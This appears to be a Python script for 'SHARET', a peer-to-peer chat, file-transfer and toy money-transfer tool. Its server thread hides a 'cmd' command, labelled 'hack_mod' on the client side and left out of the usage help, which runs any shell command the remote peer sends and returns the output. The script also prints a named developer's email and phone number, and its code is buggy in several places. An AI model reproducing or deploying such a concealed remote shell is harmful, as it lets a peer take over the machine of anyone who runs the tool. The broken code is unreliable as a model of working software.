# this version is under development and could possibly be affected by bugs or other

# importation des modules complementaires 

import time,threading,os,sqlite3,random

import sys,getpass,subprocess,hashlib

import zlib,datetime

# definition des variables globales 

global fg
fg=1

# calculer la taille des fichiers

def calc(data):
    taille=["o","Ko","Mo","Go"]
    lec3=data
    lon=len(lec3)
    if lon<=1000:
        number=0
        lon2=lon
    elif 1000<lon<1000000:
        number=1
    elif 1000000<lon<1000000000:
        number=2
    elif 1000000000<lon:
        number=3
    unit=taille[number]
    lon2=lon//(10**(3*number))
    return unit,lon2

# gestion de la base de donnee

def base_check():
    comp='a'
    donnee=(comp)
    try:
        conn=sqlite3.connect("virtual/system/base.db")
        cur=conn.cursor()
        cur.execute("create table info2 (dat )")
        cur.execute("insert into info2 (dat) values(?)",donnee)
        conn.commit()
        cur.close()
        conn.close()
        conn=sqlite3.connect("virtual/system/base.db")
        cur=conn.cursor()
        pseudo=input(" enter your nickname : ")
        mcode=input(" enter your secret money code : ")
        money=100
        hache=random.randint(1000,9999)
        pseudo=hashlib.sha224((bytes(pseudo,'utf8'))).hexdigest()
        mcode=hashlib.sha224((bytes(mcode,'utf8'))).hexdigest()
        money=hashlib.sha224((bytes(str(money),'utf8'))).hexdigest()
        don=(pseudo,mcode,money,hache)
        cur.execute("create table info (pseudo ,code,money,hache integer)")
        cur.execute("insert into info (pseudo,code,money,hache) values(?,?,?,?)",don)
        print("recording perform ...")
        conn.commit()
        cur.close()
        conn.close()

    except sqlite3.OperationalError:
        pass

# gestion du systeme de fichiers

def dir_maker():
    try:
        os.mkdir('virtual/')
        os.mkdir('virtual/system')
        os.mkdir('virtual/receved')
        os.mkdir('virtual/sended')
    except FileExistsError:
        pass

# calculer de la validite du code  

def welcome():
    print(" \t\twelcome to SHARET\n\t by toutpuissantged \n\t\t contact :: mail :amoussougedeon13@gmail.com  ; whatsapps+telegrame : +228 96870360\n \t\t\tversion : {} \n".format(version))
    date=int(time.time())
    expir=1689807440
    rest=int(expir-date)
    r_j=int(rest/(60*60*24))

    if date>=expir :
        print("your software has expired since {} days and needs an update \n please contact the developer by email at toutpuissant69@gmail.com or on whatsapps + telegrame on +228 96870360 \n NB : this software is 100% free the developer will also provide you the updates completely free of charge.".format(-r_j))
        time.sleep(5)
        exit()
    else:
        print(" \t\ttime remaining before the update: {} jours ".format(r_j))

# premiere fonction principale servant a gerer les information utilisateurs

def intro():
	global hosta,hostb,version,temp
	version="0.8"

	dir_maker()

	welcome()

	base_check()

	defo=input('use default settings  ?(Y/n) : ')
	if defo=='n':
		hosta=input("enter your network address: ")
		if hosta=="":
		    hosta="localhost"
		hostb=input("enter your friend's address: ")
		if hostb=="":
		    hostb="localhost"
		temp=input("your friend's waiting time (in seconds): ")
		if temp=="":
		    temp=1
	else:
		hosta,hostb,temp="","",1

# optimisation par  compression 

def compress_a(data,lon4,unit3):
    data=data
    lon4=lon4
    unit3=unit3
    if unit3 =="o" or unit3=="Ko":
        comp_lvl=0
    elif unit3=="Mo" :
        if 1<lon4<200:
            comp_lvl=1
        elif 200<lon4<500:
            comp_lvl=2
        elif 500<lon4<800:
            comp_lvl=3
        elif lon4>800:
            comp_lvl=4
    elif unit3=="Go":
        if lon4<=200:
            comp_lvl=6
        elif 200<lon4<500:
            comp_lvl=7
        elif 500<lon4<800:
            comp_lvl=8
        elif lon4>800:
            comp_lvl=9

    comp_end = zlib.compress(data,comp_lvl)
    return comp_end ,comp_lvl

   
def serveur():
    inte=1
    port = 5566
    n=0
    tim4=0.0
    deb=0
    ps2=False
    ps3=0
    if inte==1:
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host1=socket.gethostname()
        host1=hosta
        sock.bind((host1,port))
    if n==0:
        print("your network address is : ",str(hosta))
        n+=1
    while inte:
        sock.listen()
        conn, adress =sock.accept()

        while inte:
            msg2=conn.recv(1024).decode("utf8")
            if msg2=="send":
                neu=1
                nou=0
                msg3=conn.recv(1024).decode("utf8")
                msg6 =conn.recv(1024).decode("utf8")
                print("your friend sends you the file => ",str(msg3))
                if deb==0:
                    seuc=input('press enter to validate !!! ')
                    if seuc=="":
                        seuc=5
                    else :
                        seuc=float(seuc)
                    deb+=1
                msg4="virtual/receved/"
                msg5=msg4+msg3
                fd =open(msg5,'wb')
                ft= open('virtual/system/temp','wb')
                print("compression recu est "+msg6)
                while neu:
                    tim1=time.time()
                    ft.write(conn.recv(1024))
                    tim2=time.time()
                    tim3=(tim2-tim1)
                    tim4+=tim3
                    if nou==0:
                        print("reception in progress")
                        nou+=1
                    if tim3>=seuc:
                        tim4=int(tim4)
                        ft.close()
                        neu=0
                        ft= open('virtual/system/temp','rb')
                        z_temp=ft.read()
                        ft.close()
                        z_fin=zlib.decompress(z_temp,wbits=0)
                        fd.write(z_fin)
                        fd.close()
                        os.remove('virtual/system/temp')
                        t_now=datetime.datetime.today()
                        forma_t="["+str(t_now.year)+'-'+str(t_now.month)+'-'+str(t_now.day)+'  '+str(t_now.hour)+':'+str(t_now.minute)+':'+str(t_now.second)+"] \t "+msg3+" \t succesfuly receved \n"
                        ft2= open('virtual/system/receved.history','a')
                        ft2.write(forma_t)
                        ft2.close()
                        print("receive {} end with a time of {} seconds  \n your message : ".format(msg3,tim4))
            elif msg2=="cmd":
                msg2=conn.recv(1024).decode("utf8")
                h=subprocess.getoutput(msg2)
                conn.send(str(h).encode("utf8"))
            elif msg2=="exit":
            	print('disconnection !!!')
            	time.sleep(1)
            	sys.exit()
            elif msg2=='check':
                pass
            elif msg2=='sendall':
            	dec=conn.recv(1024).decode("utf8")
            	if dec=='end':
            		pass
            	else:
            		ps2=True
            	if ps2==True:
            		print('taille de la liste == ',dec)
            		lon=int(dec)
            		while ps3<lon:
            			
            			pass



            	ps2=False
            elif msg2=="money":
                mrecu=""
                mrecu=conn.recv(1024).decode("utf8")
                print("you just received {} money".format(mrecu))
                mrecu=int(mrecu)
                if mrecu !=0:
                    conn2=sqlite3.connect("virtual/system/base.db")
                    cur=conn2.cursor()
                    cur.execute("select money from info")
                    for l in cur:
                        liste_d=l
                    cur.execute("select pseudo from info")
                    for l in cur:
                        liste_s=l
                    cur.execute("select code from info")
                    for l in cur:
                        liste_n=l
                    cur.execute("select hache from info")
                    for l in cur:
                        liste_h=l
                    t2money=(liste_d[0])
                    snum=0
                    tb=1
                    while tb==1:
                        ts2=hashlib.sha224((bytes(str(snum),'utf8'))).hexdigest()
                        if ts2==t2money:
                            tb=0
                            t3money=snum
                        else:
                            snum+=1
                    nmoney=mrecu+t3money
                    nmomey=tb2=hashlib.sha224((bytes(str(nmoney),'utf8'))).hexdigest()
                    don2=(liste_s[0],liste_n[0],nmoney,liste_h[0])
                    cur.execute("insert into info (pseudo,code,money,hache) values(?,?,?,?)",don2)
                    conn2.commit()
                    cur.close()
                    conn2.close()
            else : 
                time.sleep(0.0)
                print("\n message from your friend: ",str(msg2))

                
def client():
   money=100
   inte=0
   port = 5566
   n=0
   dev=1
   dba=False
   pss=0
   tmoney=0
   if inte==0:
       print("attempt to connect to your friend ")
       time.sleep(int(temp))
       import socket
       host2=hostb
       socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       socket.connect((host2,port))
       print("connection established with your friend")
   while inte ==0:
        time.sleep(0.1)
        msg = input(" Your message : ")
        msg1=msg
        socket.send(msg.encode("utf8"))
        if msg1=="send":
            while dev:
                try:
                    name=input(str(("enter the name of the file or its full path:")))
                    time.sleep(1)
                    if '/' in name:
                    	nes=0
                    	nes2=0
                    	nes3=0
                    	for nez in name:
                    		if nez=='/':
                    			nes+=1
                    			nes3=nes2
                    		nes2+=1
                    	raw=name[nes3+1:]
                    	print('naw est : ',raw)
                    	fs =open(name,'rb')
                    else:
                    	raw=name
                    	fs =open("virtual/sended/"+name,'rb')
                    break
                except:
                    print("file not found !!! please check the file")
            name=raw
            print("sending {} in progress ...".format(name))
            socket.send(name.encode("utf8"))
            s1=time.time()
            temp2=fs.read()
            unit2,lon3 =calc(temp2)
            print(" \n la taille du fichier est de {} {}".format(str(lon3),str(unit2)))
            comp_res,comp_lvl2 = compress_a(temp2,lon3,unit2)
            print('\n level de compression est = {}'.format(comp_lvl2))
            socket.sendall((str(comp_lvl2)).encode("utf8"))
            socket.sendall(comp_res)
            s2=time.time()
            fs.close()
            print("time taken to send: " ,str(int((s2-s1)))," seconde(s)")
            print(" sent successful \n please wait a few seconds then type: ok")
            if comp_lvl2==0:
                slp=1
            elif comp_lvl2 >= 1:
                slp = comp_lvl2**2
            t_now=datetime.datetime.today()
            forma_t="["+str(t_now.year)+'-'+str(t_now.month)+'-'+str(t_now.day)+'  '+str(t_now.hour)+':'+str(t_now.minute)+':'+str(t_now.second)+"] \t "+raw+" \t succesfuly send  \n"
            ft2= open('virtual/system/send.history','a')
            ft2.write(forma_t)
            ft2.close()
            time.sleep(slp)
        elif msg1=='sendall':
        	time.sleep(1)
        	name2=input(str(("enter the full path of the folder to send: ")))

        	try:
        		ch=os.listdir(name2)
        		print(ch)
        		pss=1
        	except:
        		print('invalid path specifier !!! ')
        		socket.send('end'.encode("utf8"))
        		pss=0
        	if pss==1:
        		socket.send(str(len(ch)).encode("utf8"))
        	if name2[-1]=='/':
        		pass
        	elif name2[-1]!='/':
        		name2=name2+'/'
        	print(name2)


        elif msg1=="exit":
        	print('disconnection !!!')
        	time.sleep(3)
        	sys.exit()
        elif msg1=='cmd':
        	ck=input('hack_mod <<< ')
        	socket.send(ck.encode("utf8"))
        	tp=socket.recv(1024).decode("utf8")
        	print('return >>>',tp)
        elif msg1=='check':
            if dba==True:
                print('your amount is ',str(tmoney))
            else:
                print('no transaction performed previously !!!')
        elif msg1=='':
        	print('use: \n send ==> to send a file \n money ==> to send money \n exit ==> to close the program \n check ==> your money amount')
        elif msg1=="money":
            deb=1
            msend=input("amount to send : ")
            while deb:
                try:
                    msend=int(msend)
                    deb=0
                except :
                    deb=1
                    msend=input("incorrect amount; try again : ")
            evy=int(msend)
            conn=sqlite3.connect("virtual/system/base.db")
            cur=conn.cursor()
            if dba==False:
	            cur.execute("select money from info")
	            for l in cur:
	                liste_d=l
	            cur.execute("select pseudo from info")
	            for l in cur:
	                liste_s=l
	            cur.execute("select code from info")
	            for l in cur:
	                liste_n=l
	            hmoney=(liste_d[0])
	            cur.execute("select hache from info")
	            for l in cur:
	                liste_h=l
            elif dba==True:pass
            dba=True
            tnum=0
            tb=1
            mdp=getpass.getpass(" enter the secret code : ")
            mdp=hashlib.sha224((bytes(mdp,'utf8'))).hexdigest()

            if mdp==liste_n[0]: 
                print('verification in progress ...')
                while tb==1:
                    tb2=hashlib.sha224((bytes(str(tnum),'utf8'))).hexdigest()
                    if tb2==hmoney:
                        tb=0
                        tmoney=tnum
                    else:
                        tnum+=1
                if evy > tmoney:
                    envy="0"
                    print(" your amount is insufficient + {} excess money ".format(str(evy-tmoney)))
                elif 0<evy <= tmoney:
                    envy=str(evy)
                    tmoney = tmoney-evy
                    hmoney=hashlib.sha224((bytes(str(tmoney),'utf8'))).hexdigest()
                    don1=(liste_s[0],liste_n[0],hmoney,liste_h[0])
                    cur.execute("insert into info (pseudo,code,money,hache) values(?,?,?,?)",don1)
                    print("amount send ")
                    print("your current amount is {} money ".format(tmoney))
                else:
                    envy="0"
                    print("an error occurred, transaction cancel ")
            else:
                print("Wrong password")
                envy="0"
            socket.sendall(envy.encode("utf8"))
            conn.commit()
            cur.close()
            conn.close()

   
intro()

# utilisation des processus en parralele

t1=threading.Thread(target=serveur)
t2=threading.Thread(target=client)

t1.start()
t2.start()

while 1:
    
    t1.join()
    t2.join()
